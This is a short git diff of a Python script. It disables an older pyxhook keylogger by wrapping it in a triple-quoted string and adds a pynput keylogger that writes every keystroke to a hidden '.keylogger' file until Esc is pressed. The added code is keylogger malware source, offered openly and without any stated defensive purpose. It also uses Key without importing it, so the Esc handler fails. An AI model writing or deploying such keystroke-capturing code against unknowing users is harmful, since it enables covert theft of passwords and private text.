@@ -4,7 +4,7 @@
 # 1. pyxhook.py: file is provided in the folder itself
 # 2. Xlib: sudo pip3 install python3-Xlib
 
-import pyxhook
+'''import pyxhook
 import time
 
 # functions to write a newline character into the file
@@ -47,3 +47,25 @@ if __name__ == '__main__':
 
 	# Close the listener when we are done
 	hookman.cancel()
+'''
+
+from pynput.keyboard import Listener
+
+# Functions to handle key press and release events
+def on_key_press(key):
+    try:
+        with open('.keylogger', 'a') as f:
+            f.write(str(key.char))
+    except AttributeError:
+        # Handle special keys
+        with open('.keylogger', 'a') as f:
+            f.write(str(key))
+
+def on_key_release(key):
+    if key == Key.esc:
+        # Terminate the listener
+        return False
+
+# Create a listener for both key press and release events
+with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+    listener.join()
